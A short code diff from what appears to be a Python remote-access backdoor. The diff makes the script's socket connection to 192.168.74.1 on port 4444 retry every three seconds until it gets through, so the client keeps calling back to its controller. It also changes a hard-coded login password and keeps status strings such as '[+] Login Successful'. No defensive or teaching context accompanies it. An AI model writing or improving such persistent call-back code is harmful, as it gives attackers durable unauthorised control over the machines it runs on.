@@ -56,11 +56,17 @@ engine.runAndWait()
 
 
 connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connection.connect(("192.168.74.1", 4444))
+while True:
+    time.sleep(3)
+    try:
+        connection.connect(("192.168.74.1", 4444))
+        break
+    except Exception as e:
+        print(e)
 
 
 oss = sys.platform
-passwd = "Testing95**"
+passwd = "Testing95"
 logsuc = "[+] Login Successful"
 logfail = "Incorrect"
 something = "something"
